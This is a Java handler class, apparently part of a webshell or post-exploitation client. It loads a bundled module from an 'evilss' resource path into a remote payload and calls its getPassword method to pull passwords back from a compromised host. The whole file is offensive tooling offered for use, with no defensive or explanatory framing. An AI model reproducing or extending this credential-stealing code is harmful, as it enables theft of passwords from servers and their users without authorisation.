/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package com.theplutin.handler;

import util.functions;
import util.http.ReqParameter;

/**
 *
 * @author Administrator
 */
public class GetPassword extends HandlerBase{
    public String handler(){
        this.payload.include("GetPassword", functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("/evilss/GetPassword.classs")));
        ReqParameter reqParameter = ReqParameter.createInvokeMethodReqParameter();
        reqParameter.add("aaa", "aaa");
        return encoding.Decoding(payload.evalFunc("GetPassword", "getPassword", reqParameter));
    }
    
}
